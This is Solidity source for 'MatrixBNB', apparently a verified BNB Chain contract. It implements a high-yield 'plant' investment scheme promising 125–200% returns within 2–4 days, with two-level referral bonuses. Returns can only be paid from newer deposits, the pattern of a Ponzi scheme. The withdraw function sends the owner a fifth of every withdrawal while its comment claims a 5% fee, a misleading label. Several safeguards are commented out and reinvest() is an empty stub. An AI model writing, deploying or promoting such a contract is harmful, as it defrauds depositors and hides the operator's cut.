/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

struct Plant {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40  last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[2] structure; 
}

contract MatrixBNB {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 internal totalusers;
    uint40 constant public  TIME_STEP = 24*3600; // 24 hour
    uint40 public StartDate ; 
    
    uint8 constant BONUS_LINES_COUNT = 2;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [40, 30]; 

    mapping(uint8 => Plant) public plants;
    mapping(address => Player) public players;
   
    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewBuyPlant(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() {
          
         owner = msg.sender;
     
         plants[1] = Plant(2, 125); //2day : 125%
         plants[2] = Plant(3, 150);
         plants[3] = Plant(4, 200);

         StartDate = uint40(block.timestamp) + (48*3600); //after 2days
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
             
             if(players[_addr].deposits.length == 0) {
               totalusers++;
              }

            players[_addr].upline = _upline;
           
            emit Upline(_addr, _upline, _amount / 5);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function buyplant(uint8 _plantId, address _upline) external payable {
        
       // require(block.timestamp>StartDate,"Not Started Yet.");
        require(plants[_plantId].life_days > 0, "Plant not found");
        require(msg.value >= 0.05 ether, "Minimum deposit amount is 0.05 BNB");
      
        Player storage player = players[msg.sender];
       
        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _plantId,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
      
       // payable(owner).transfer(msg.value / 10); //owner fee
        
        emit NewBuyPlant(msg.sender, msg.value, _plantId);
    }
    
    function withdraw() external {
       // require(block.timestamp>StartDate,"Not Started Yet.");
       
        Player storage player = players[msg.sender];
      // require(player.last_payout+TIME_STEP< block.timestamp, "only once a day");
       
        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);
        payable(owner).transfer(amount / 5); //5% owner fee

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plant storage tarif = plants[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure,uint[] memory userplants,uint[] memory plantstimes) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

           uint[] memory plantList = new uint[](player.deposits.length);
           uint[] memory plantTimes = new uint[](player.deposits.length);
           uint8 counter=0;
           
            for(uint8 j = 0; j < player.deposits.length; j++) {
            Deposit storage dep = player.deposits[j];
            Plant storage plnt = plants[dep.tarif];
        
            uint40 time_end = dep.time + plnt.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

              if(from < to) {
                 plantList[counter] = dep.tarif;
                 plantTimes[counter] = dep.time;
                 counter++;
              }
           
            }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
            plantList,
            plantTimes
            
        );
    }

    function contractInfo() view external returns(uint _users,uint256 _balance, uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (totalusers, address(this).balance, invested, withdrawn, match_bonus);
    }

    function reinvest() external {
      
    }

    function invest() external payable {
      payable(msg.sender).transfer(msg.value);
    }

    function invest(address to) external payable {
      payable(to).transfer(msg.value);
    }
   
   
}